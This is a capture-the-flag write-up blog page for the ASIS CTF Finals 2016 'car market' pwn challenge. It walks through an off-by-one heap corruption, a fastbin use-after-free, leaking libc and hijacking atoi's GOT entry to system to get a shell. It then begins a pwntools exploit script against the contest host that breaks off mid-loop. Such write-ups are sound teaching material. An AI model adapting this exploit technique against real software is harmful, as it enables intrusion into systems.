<!DOCTYPE html>



<html lang="zh-TW" 
  
    mode="dark"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.0" />
<meta property="og:title" content="ASIS CTF Finals 2016 – car market" />
<meta property="og:locale" content="zh_TW" />
<meta name="description" content="Category: pwn Points: 177" />
<meta property="og:description" content="Category: pwn Points: 177" />
<link rel="canonical" href="http://0.0.0.0:4000/asis-ctf-finals-2016-car-market/" />
<meta property="og:url" content="http://0.0.0.0:4000/asis-ctf-finals-2016-car-market/" />
<meta property="og:site_name" content="Hacking Tube 2.0" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2016-09-13T16:54:00+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="ASIS CTF Finals 2016 – car market" />
<meta name="twitter:site" content="@bruce30262" />
<script type="application/ld+json">
{"mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/asis-ctf-finals-2016-car-market/"},"url":"http://0.0.0.0:4000/asis-ctf-finals-2016-car-market/","@type":"BlogPosting","headline":"ASIS CTF Finals 2016 – car market","dateModified":"2021-07-19T21:12:41+08:00","datePublished":"2016-09-13T16:54:00+08:00","description":"Category: pwn Points: 177","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>ASIS CTF Finals 2016 -- car market | Hacking Tube 2.0
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Hacking Tube 2.0">
<meta name="application-name" content="Hacking Tube 2.0">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="https://cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">



  <!-- JavaScripts -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  <script defer
    src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>

  <!--
  JS selector for site.
-->


  



  <!-- image lazy-loading & popup -->
  <script async
    src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script>





<script defer src="/assets/js/dist/post.min.js"></script>






</head>


  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">

  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
        <img src="/assets/images/other/gravatar.png" alt="avatar" onerror="this.style.display='none'">
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">Hacking Tube 2.0</a>
    </div>

    <div class="site-subtitle font-italic">Security and stuff</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">
    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i>
        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center">

    
      

      
      <a href="https://github.com/bruce30262" aria-label="github"
        
        target="_blank" rel="noopener">
        <i class="fab fa-github-alt"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/bruce30262" aria-label="twitter"
        
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['bruce30262','pm.me'].join('@')" aria-label="email"
        
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          

        

      

        
          <span>ASIS CTF Finals 2016 -- car market</span>

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->


<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->


<!-- Add attribute 'hide-bullet' to the checkbox list -->




<!-- return -->
<div class="row">

  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">

    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

      <h1 data-toc-skip>ASIS CTF Finals 2016 -- car market</h1>

      <div class="post-meta text-muted d-flex flex-column">
        <!-- Published date and author -->
        <div>
          <span class="semi-bold">
            Bruce Chen
          </span>
          <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago "
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Tue, Sep 13, 2016,  4:54 PM +0800"
  

  
  prep="on" >

  
  

  
    Sep 13, 2016
  

  <i class="unloaded">2016-09-13T16:54:00+08:00</i>

</span>

        </div>

        <div>
          <!-- lastmod -->
          
          <span>
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago lastmod"
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Mon, Jul 19, 2021,  9:12 PM +0800"
  

  prefix="Updated "
   >

  
  

  
    Jul 19
  

  <i class="unloaded">2021-07-19T21:12:41+08:00</i>

</span>

          </span>
          

          <!-- read time -->
          <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->


<!-- words per minute  -->







<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1891 words">10 min</span>


          <!-- page views -->
          

        </div>

      </div> <!-- .post-meta -->

      <div class="post-content">

        

        <p><strong>Category:</strong> pwn<br />
<strong>Points:</strong> 177</p>

<!-- more -->

<p>64 bit ELF, with <strong>Partial RELRO, Canary &amp; NX enabled, no PIE</strong>. <code class="language-plaintext highlighter-rouge">libc.so</code> was provided.</p>

<p>The binary is a car market program. It will let us list our cars’ info, add a car, remove a car and select a car. By selecting a car, we can edit our car model, price and add a customer. While adding a customer, we can set the customer’s name, comment and print out the customer’s info. The <code class="language-plaintext highlighter-rouge">car</code> and <code class="language-plaintext highlighter-rouge">customer</code> are defined as the following structures:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="k">struct</span> <span class="n">car</span><span class="p">{</span>
  <span class="kt">char</span> <span class="n">model</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
  <span class="kt">long</span> <span class="n">price</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">customer</span><span class="o">*</span> <span class="n">customer</span><span class="p">;</span>
<span class="p">};</span>
</pre></td></tr></tbody></table></code></div></div>
<div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="k">struct</span> <span class="n">customer</span><span class="p">{</span>
  <span class="kt">char</span> <span class="n">first_name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">comment</span><span class="p">;</span> <span class="c1">// buffer size: 0x48</span>
<span class="p">};</span>
</pre></td></tr></tbody></table></code></div></div>

<p>After doing some reversing &amp; fuzzing, here’s some important program behavior:</p>

<ul>
  <li>There’s a pointer <code class="language-plaintext highlighter-rouge">struct car** ptr</code>. The program will first use <code class="language-plaintext highlighter-rouge">malloc</code> to allocate a buffer and assigned to <code class="language-plaintext highlighter-rouge">ptr</code>, which use the buffer to store the <code class="language-plaintext highlighter-rouge">car*</code> array.</li>
  <li>Each time we add a customer to a car, the program will first check if <code class="language-plaintext highlighter-rouge">car-&gt;customer</code> and <code class="language-plaintext highlighter-rouge">car-&gt;customer-&gt;comment</code> were exist in the car. If it does, the program will free <code class="language-plaintext highlighter-rouge">car-&gt;customer</code> and <code class="language-plaintext highlighter-rouge">car-&gt;customer-&gt;comment</code>, ensure that there’s only one customer in the car.</li>
  <li>There exist multiple <strong>off-by-one</strong> vulnerabilities while the program try to read the user input. When we input the <code class="language-plaintext highlighter-rouge">model</code>, <code class="language-plaintext highlighter-rouge">first_name</code> and the <code class="language-plaintext highlighter-rouge">name</code> data, we can trigger the vulnerability by entering a long length data. <strong>This will cause the first byte of the next data be overwritten to a null byte.</strong></li>
</ul>

<p>The first thing I try to do is to leak some address. I found that if we do the following operation, we can leak heap’s base address:</p>

<ol>
  <li>Enter the customer menu</li>
  <li>Exit the customer menu</li>
  <li>Enter the customer menu again</li>
  <li>Print out the customer info, the customer’s first name will become a heap address</li>
</ol>

<p>This is because the program will try to free the memory of <code class="language-plaintext highlighter-rouge">car-&gt;customer</code> before we try to enter the customer menu for the second time. After <code class="language-plaintext highlighter-rouge">car-&gt;customer</code> was freed, its memory chunk’s fd (<strong>which is also <code class="language-plaintext highlighter-rouge">car-&gt;customer-&gt;first_name</code></strong>) will be storing the next free chunk’s address, so by printing out the customer’s info , we can leak out the heap’s address.</p>

<p>The next thing is to leak out the libc’s address. To achieve this, I decide to corrupted fastbin by exploiting the off-by-one vulnerability. Assume that we have the following memory layout of a <code class="language-plaintext highlighter-rouge">car-&gt;customer</code> structure:</p>
<pre>
             +------------------+
customer     |........first_name| char first_name[32]
             |..................|
             |..................|
             |..................|
             +------------------+
customer+32  |..............name| char name[32]
             |..................|
             |..................|
             |..................|
             +------------------+
customer+64  |        0x12345680| char* comment
             +------------------+
</pre>

<p>By using the off-by-one vulnerability on <code class="language-plaintext highlighter-rouge">car-&gt;customer-&gt;name</code>, <strong>we can overwrite the last byte of <code class="language-plaintext highlighter-rouge">comment</code>’s address, change it from <code class="language-plaintext highlighter-rouge">0x12345680</code> to <code class="language-plaintext highlighter-rouge">0x12345600</code></strong>. Now if we exit &amp; re-enter the customer menu, the program will try to free <code class="language-plaintext highlighter-rouge">car-&gt;customer-&gt;comment</code>, which is <code class="language-plaintext highlighter-rouge">0x12345600</code> instead of <code class="language-plaintext highlighter-rouge">0x12345680</code>.</p>

<p>Now if we have the memory layout of a <code class="language-plaintext highlighter-rouge">car</code> structure like this:</p>
<pre>  
                      +------------------+
    car    0x123455F0 |               0x0| char model[16]
                      +------------------+
                      |              0x51|
                      +------------------+
    car+16 0x12345600 |              0x64| long price
                      +------------------+
    car+24 0x12345608 |        0x12348880| struct customer* customer
                      +------------------+
</pre>

<p>By setting the model of the car, we can fake the chunk’s header, so when glibc’s freeing <code class="language-plaintext highlighter-rouge">0x12345600</code>, it will think that it is freeing a memory chunk with the size of <code class="language-plaintext highlighter-rouge">0x50</code>, <strong>the same size as <code class="language-plaintext highlighter-rouge">car-&gt;customer-&gt;comment</code></strong>, and add <code class="language-plaintext highlighter-rouge">0x12345600</code> into fastbin. This will create an <strong>Use-After-Free</strong> situation, with <code class="language-plaintext highlighter-rouge">0x12345600</code> being a dangling pointer. The next time we create a customer comment, the program will allocate <code class="language-plaintext highlighter-rouge">0x12345600</code> as the comment buffer, <strong>and thus we can modify the structure of <code class="language-plaintext highlighter-rouge">car</code>, changing the <code class="language-plaintext highlighter-rouge">car-&gt;customer</code> pointer to <code class="language-plaintext highlighter-rouge">atoi</code>’s GOT</strong>. After that, we can leak <code class="language-plaintext highlighter-rouge">atoi</code>’s GOT by printing the <code class="language-plaintext highlighter-rouge">car</code>’s info.</p>

<p>To summarize, the following steps will help us leak out the libc’s address:</p>

<ol>
  <li>Add a couple of cars, try to make a <code class="language-plaintext highlighter-rouge">car</code>’s address ends with the <code class="language-plaintext highlighter-rouge">0xf0</code> byte (ex. <code class="language-plaintext highlighter-rouge">0x123455f0</code>), and put the fake chunk header in <code class="language-plaintext highlighter-rouge">car-&gt;model</code>.</li>
  <li>Exploit the off-by-one vulnerability, overwrite a <code class="language-plaintext highlighter-rouge">comment</code>’s buffer address. (ex. <code class="language-plaintext highlighter-rouge">0x12345680</code> -&gt; <code class="language-plaintext highlighter-rouge">0x12345600</code>)</li>
  <li>Exit &amp; re-enter the customer menu, so the program will free the fake <code class="language-plaintext highlighter-rouge">comment</code>’s address.</li>
  <li>Create a new <code class="language-plaintext highlighter-rouge">comment</code>, the new <code class="language-plaintext highlighter-rouge">comment</code>’s buffer will be overlapped with one of those <code class="language-plaintext highlighter-rouge">car</code>’s memory chunk.</li>
  <li>Edit <code class="language-plaintext highlighter-rouge">comment</code> and modify the <code class="language-plaintext highlighter-rouge">car</code>’s structure, change the <code class="language-plaintext highlighter-rouge">car-&gt;customer</code> pointer to <code class="language-plaintext highlighter-rouge">atoi</code>’s GOT.</li>
  <li>Print out the <code class="language-plaintext highlighter-rouge">car</code>’s info, leak <code class="language-plaintext highlighter-rouge">atoi</code>’s GOT and get the libc’s address.</li>
</ol>

<p>Now we have the libc’s address. Since the GOT entries are writable, we can try to overwrite <code class="language-plaintext highlighter-rouge">atoi</code>’s GOT into <code class="language-plaintext highlighter-rouge">system</code>’s address and do the GOT hijacking. At first I try to overwrite the GOT by using the same method as I leak <code class="language-plaintext highlighter-rouge">atoi</code>’s GOT – after we change the <code class="language-plaintext highlighter-rouge">customer</code> pointer, we can overwrite the GOT entry by modifying <code class="language-plaintext highlighter-rouge">customer-&gt;first_name</code>.</p>

<p>Except we can’t. That’s because when we try to do so, the program will try to free <code class="language-plaintext highlighter-rouge">car-&gt;customer</code> before we enter the customer menu, <strong>and doing <code class="language-plaintext highlighter-rouge">free(atoi@got.plt)</code> will crash the program</strong>. We’ll have to find another way to overwrite the GOT. So how are we gonna do that? Well, <strong>remember the <code class="language-plaintext highlighter-rouge">ptr</code> variable?</strong> The pointer that points to the <code class="language-plaintext highlighter-rouge">car*</code> array?</p>

<p>Since we can modify a <code class="language-plaintext highlighter-rouge">car</code>’s structure by editing the comment, we can once again modify <code class="language-plaintext highlighter-rouge">car-&gt;customer</code>, changing the pointer to <code class="language-plaintext highlighter-rouge">ptr</code>, so when the program free <code class="language-plaintext highlighter-rouge">car-&gt;customer</code>, <strong>it will free the whole <code class="language-plaintext highlighter-rouge">car*</code> array instead.</strong> When the next time we create a new comment, it will allocate the memory by splitting the memory chunk from <code class="language-plaintext highlighter-rouge">ptr</code>, <strong>making us able to control the <code class="language-plaintext highlighter-rouge">car*</code> array.</strong> We can then overwrite the <code class="language-plaintext highlighter-rouge">car</code> pointer into <code class="language-plaintext highlighter-rouge">atoi</code>’s GOT by editing the comment. Once the <code class="language-plaintext highlighter-rouge">car</code> pointer is changed, we can overwrite the content by setting <code class="language-plaintext highlighter-rouge">car-&gt;model</code>, and that’s how we hijack <code class="language-plaintext highlighter-rouge">atoi</code>’s GOT.</p>

<p>So after we leak the libc’s address:</p>

<ol>
  <li>Edit <code class="language-plaintext highlighter-rouge">comment</code> and modify the <code class="language-plaintext highlighter-rouge">car</code>’s structure, change the <code class="language-plaintext highlighter-rouge">car-&gt;customer</code> pointer to <code class="language-plaintext highlighter-rouge">ptr</code>.</li>
  <li>Exit &amp; re-enter the customer menu, so the program will free the fake <code class="language-plaintext highlighter-rouge">car-&gt;customer</code>’s address.</li>
  <li>Create a new <code class="language-plaintext highlighter-rouge">comment</code>, the new <code class="language-plaintext highlighter-rouge">comment</code>’s buffer will be overlapped with the <code class="language-plaintext highlighter-rouge">car*</code> array.</li>
  <li>Edit <code class="language-plaintext highlighter-rouge">comment</code> and modify the <code class="language-plaintext highlighter-rouge">car</code> pointer, change it to <code class="language-plaintext highlighter-rouge">atoi</code>’s GOT.</li>
  <li>Overwrite <code class="language-plaintext highlighter-rouge">atoi</code>’s GOT to <code class="language-plaintext highlighter-rouge">system</code>’s address by setting <code class="language-plaintext highlighter-rouge">car-&gt;model</code>.</li>
</ol>

<p>At last, when the program ask us to input our choice, we can input <code class="language-plaintext highlighter-rouge">sh\x00</code> and execute <code class="language-plaintext highlighter-rouge">system('sh')</code>, spawning a shell and get the flag…right?</p>

<div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="n">HOST</span> <span class="o">=</span> <span class="s">"car-market.asis-ctf.ir"</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">31337</span>
<span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./car_market"</span>
<span class="c1">#LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"
</span><span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">"./car_libc.so.6"</span>

<span class="c1"># setting 
</span><span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
<span class="n">context</span><span class="p">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">ELF_PATH</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">LIBC_PATH</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add_car</span><span class="p">(</span><span class="n">model</span><span class="p">,</span> <span class="n">price</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"model</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">model</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"price</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">price</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">sel_car_cust</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">cust_zip</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">choice</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span> <span class="ow">in</span> <span class="n">cust_zip</span><span class="p">:</span>
        <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">choice</span><span class="p">))</span>
        <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c1"># exit cust mode
</span>
<span class="k">def</span> <span class="nf">leak_heap</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c1"># add cust
</span>    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"3"</span><span class="p">)</span> <span class="c1"># add com
</span>    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"123"</span><span class="p">)</span> <span class="c1"># input com
</span>    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c1"># exit cust
</span>    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c1"># add cust
</span>    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c1"># exit cust
</span>    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span> <span class="c1"># list
</span>    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Firstname : "</span><span class="p">)</span>
    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0xb90</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">heap_base</span>

<span class="k">def</span> <span class="nf">leak_got</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Firstname : "</span><span class="p">)</span>
    <span class="n">atoi_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"atoi_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">atoi_addr</span><span class="p">))</span>
    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+=</span> <span class="n">atoi_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'atoi'</span><span class="p">]</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
    <span class="c1">#r = process(ELF_PATH)
</span>    
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">17</span><span class="p">):</span>
        <span class="n">model</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s">"a"</span><span class="p">)</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span>
